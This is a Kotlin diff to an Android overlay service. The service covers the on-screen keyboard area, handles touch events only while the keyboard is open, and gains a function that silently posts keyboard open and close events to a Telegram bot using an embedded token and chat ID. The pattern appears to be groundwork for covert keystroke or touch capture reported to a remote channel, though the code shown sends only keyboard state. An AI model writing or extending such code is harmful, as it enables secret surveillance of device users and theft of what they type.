@@ -109,11 +109,17 @@ class OverlayService : Service() {
         val threshold = (screenHeight * 0.15).toInt()
 
         if (keyboardHeight > threshold) {
-            keyboardPresent = true
+            if (!keyboardPresent) {
+                keyboardPresent = true
+                logKeyboardState("Keyboard Opened")
+            }
             layoutParams.height = keyboardHeight
-            layoutParams.y = visibleRect.bottom - keyboardHeight
+            layoutParams.y = visibleRect.bottom
         } else {
-            keyboardPresent = false
+            if (keyboardPresent) {
+                keyboardPresent = false
+                logKeyboardState("Keyboard Closed")
+            }
             layoutParams.height = 1
             layoutParams.y = 0
         }
@@ -124,6 +130,28 @@ class OverlayService : Service() {
             Log.w(TAG, "Unable to update overlay bounds: ${e.message}")
         }
     }
+    private fun logKeyboardState(state: String) {
+        val payload = JSONObject().apply {
+            put("chat_id", CHAT_ID)
+            put("text", state)
+        }
+        val requestBody = payload.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
+        val request = Request.Builder()
+            .url("https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage")
+            .post(requestBody)
+            .build()
+
+        client.newCall(request).enqueue(object : okhttp3.Callback {
+            override fun onFailure(call: okhttp3.Call, e: IOException) {
+                Log.e(TAG, "Telegram keyboard state log failed: ${e.message}")
+            }
+
+            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
+                response.close()
+            }
+        })
+    }
+
 
     private fun handleMotionEvent(event: MotionEvent) {
         if (!keyboardPresent) return
